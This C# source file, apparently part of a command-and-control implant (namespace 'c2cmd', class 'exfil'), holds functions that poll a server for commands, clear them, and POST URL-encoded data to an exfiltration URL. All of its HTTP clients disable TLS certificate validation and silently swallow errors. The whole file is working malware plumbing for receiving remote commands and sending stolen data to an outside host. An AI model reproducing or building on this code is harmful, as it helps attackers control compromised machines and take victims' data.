using System.Text;
using System.Web;

namespace c2cmd {
    internal static class exfil {
        public static string exfilUrl = "";
        public static string clearCmdUrl = "";
        public static string cmdCheckUrl = "";
        
    public static HttpClientHandler getHandler() {
            var handler = new HttpClientHandler() {
                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
            };
            return handler;
        }
        public static string getCommandAsync() {
            try {
                using var client = new HttpClient(getHandler());
                var content = client.Send(new HttpRequestMessage(HttpMethod.Get, cmdCheckUrl) { } );
                return content.Content.ReadAsStringAsync().Result;
            }
            catch { }
            return String.Empty;
        }
        public static void clearCommand() {
            try {
                using (HttpClient httpClient = new HttpClient(getHandler())) {
                    httpClient.DefaultRequestHeaders.Accept.Clear();
                    var task = httpClient.GetAsync(clearCmdUrl).Result;
                }
            }
            catch { }
        }
        public static void exfilData(string data) {
            using (HttpClient httpClient = new HttpClient(getHandler())) {
                var stringContent = new StringContent("d=" + HttpUtility.UrlEncode(data), Encoding.UTF8, "text/plain");
                httpClient.Send(new HttpRequestMessage(HttpMethod.Post, exfilUrl) { Content = stringContent });
            }
        }
    }
}